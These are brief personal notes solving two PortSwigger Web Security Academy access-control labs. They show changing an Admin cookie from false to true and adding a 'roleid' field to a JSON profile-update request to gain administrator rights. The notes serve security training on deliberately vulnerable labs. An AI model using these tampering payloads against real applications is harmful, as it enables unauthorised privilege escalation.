Url: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
use BurpSuite
```
Cookie: Admin=true; session=fqp8yYIRTldGT5v9M2wvHvMALbkDz6kP
Observe that the response sets the cookie Admin=false. Change it to Admin=true.
```
Url: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it.
Observe that the response shows your roleid has changed to 2. 
```
{"email":"test@gmail.com" }
convert to
{"email":"test@gmail.com",
"roleid":2}
 or
"roleid:1,2,3,4" like that
```
